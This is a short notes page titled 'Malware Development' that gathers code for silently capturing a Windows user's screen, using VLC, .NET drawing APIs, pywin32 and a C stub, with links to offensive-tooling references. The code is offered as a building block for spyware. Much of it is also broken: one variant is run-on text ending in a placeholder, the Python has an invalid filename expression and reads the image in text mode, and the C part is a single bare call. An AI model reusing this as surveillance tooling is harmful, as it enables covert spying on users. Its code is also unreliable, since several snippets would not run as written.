# Malware Development

## Scripting

### PowerShell

To capture screenshot via VLC.

```powershell
PS C:\> Get-Content .\Invoke-VlcScreenshot.ps1
function Take-VlcScreenshot {
    param(
        [string]$outputPath = "C:\screenshot"
    )
    $vlcPath = "C:\Program Files\VideoLAN\VLC\vlc.exe"
    $command = "-I dummy screen:// :screen-fps=1 :screen-follow-mouse --video-filter=scene --vout=dummy --start-time=1 --run-time=1 --scene-format=png --scene-prefix=screenshot --scene-path=$outputPath vlc://quit"
    Start-Process -FilePath $vlcPath -ArgumentList $command -NoNewWindow
}
```

## .NET

### PowerShell

First variant.

```powershell
Param(  
    [Parameter(Mandatory = $true)][string]$Path  
)  
  
$FileName = "$Env:COMPUTERNAME-$(Get-Date -Format yyyy-MM-dd_HHmmss).bmp"  
$File = "$Path\$FileName"  
  
Add-Type -AssemblyName System.Windows.Forms  
Add-Type -AssemblyName System.Drawing  
$Screen = [System.Windows.Forms.SystemInformation]::VirtualScreen  
$Width = $Screen.Width  
$Height = $Screen.Height  
$Left = $Screen.Left  
$Top = $Screen.Top  
  
$bitmap = New-Object System.Drawing.Bitmap $Width, $Height  
$graphic = [System.Drawing.Graphics]::FromImage($bitmap)  
$graphic.CopyFromScreen($Left, $Top, 0, 0, $bitmap.Size)  
$bitmap.Save($File)   
  
Write-Output "Screenshot saved to:"  
Write-Output $File
```

Second variant.

```powershell
Add-Type -TypeDefinition @" using System; using System.Drawing; using System.Runtime.InteropServices;
public class ScreenCapture { [DllImport("user32.dll")] public static extern IntPtr GetDesktopWindow();
[DllImport("user32.dll")] public static extern IntPtr GetWindowDC(IntPtr hWnd);
[DllImport("gdi32.dll")] public static extern bool BitBlt(IntPtr hObject, int nXDest, int nYDest, int
nWidth, int nHeight, IntPtr hObjectSource, int nXSrc, int nYSrc, int dwRop); } "@ $desktop =
[ScreenCapture]::GetDesktopWindow() $dc = [ScreenCapture]::GetWindowDC($desktop) # Further code to
perform screen capture goes here
```

## WinAPI

### Python

```python
import win32api
import win32con
import win32gui
import win32ui
from time import sleep

GetSystemMetrics = win32api.GetSystemMetrics
GetDesktopWindow = win32gui.GetDesktopWindow
GetWindowDC = win32gui.GetWindowDC
CreateDCFromHandle = win32ui.CreateDCFromHandle
CreateBitmap = win32ui.CreateBitmap
DeleteObject = win32gui.DeleteObject

def get_dimensions():
	width = GetSystemMetrics(win32con.SM_CXVIRTUALSCREEN)
	height = GetSystemMetrics(win32con.SM_CYVIRTUALSCREEN)
	left = GetSystemMetrics(win32con.SM_XVIRTUALSCREEN)
	top = GetSystemMetrics(win32con.SM_YVIRTUALSCREEN)

	return (width, height, left, top)

def screenshot(name):
	handle_desktop_window = GetDesktopWindow()
	width, height, left, top = get_dimensions()

	desktop_dc = GetWindowDC(handle_desktop_window)
	image_dc = CreateDCFromHandle(desktop_dc)
	memory_dc = image_dc.CreateCompatibleDC()

	screenshot = CreateBitmap()
	screenshot.CreateCompatibleBitmap(image_dc, width, height)
	memory_dc.SelectObject(screenshot)
	memory_dc.BitBlt((0, 0), (width, height), image_dc, (left, top), win32con.SRCCOPY)
	screenshot.SaveBitmapFile(memory_dc, f"{name}".bmp)

	memory_dc.DeleteDC()
	DeleteObject(screenshot.GetHandle())

def main() -> None:
	filename = 'screenshot_output'
	screenshot(filename)
	with open(filename + '.bmp') as f:
		image = f.read()
	return image

if __name__ == '__main__':
	sleep(5)
	main()
```

### C

```c
#include <windows.h>
#include <winuser.h>

#pragma comment(lib, "user32.lib")

GetDC()
```

---
## References

### MalAPI

- [MalAPI: GetDC](https://malapi.io/winapi/GetDC)

### LOLAPPS

- [LOLAPPS (Living Off The Land Applications)](https://lolapps-project.github.io/)

### Jakoby

- [Jakoby: takeScreenShot](https://github.com/I-Am-Jakoby/PowerShell-for-Hackers/blob/main/VideoNotes/takeScreenShot.md)